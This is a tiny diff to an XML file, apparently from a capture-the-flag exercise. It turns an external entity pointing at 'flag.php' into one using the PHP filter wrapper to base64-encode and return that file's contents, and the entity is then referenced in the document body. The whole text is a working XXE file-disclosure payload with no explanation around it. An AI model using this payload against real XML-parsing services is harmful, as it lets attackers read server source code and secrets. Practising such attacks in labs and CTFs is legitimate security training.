@@ -1,6 +1,6 @@
 <?xml version="1.0"?>
 <!DOCTYPE root [
-  <!ENTITY test SYSTEM 'flag.php'>
+  <!ENTITY test SYSTEM 'php://filter/convert.base64-encode/resource=flag.php'>
 ]>
 <root>
 &test;
